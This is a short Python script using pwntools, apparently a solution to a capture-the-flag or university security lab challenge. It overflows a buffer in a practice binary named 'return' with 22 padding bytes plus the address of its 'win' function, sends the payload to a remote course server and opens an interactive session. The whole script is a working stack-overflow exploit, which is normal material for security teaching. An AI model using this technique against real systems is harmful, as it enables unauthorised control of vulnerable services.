from pwn import *
import sys

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '22154'

elf = ELF('./return')

s = b'A' * 22 + p32(elf.symbols['win'])

#s = b'A' * 22 + p32(0x080486f1)

p = remote(host, port)
#p = process('./return')

#raw_input()

p.sendline(s)
p.interactive()
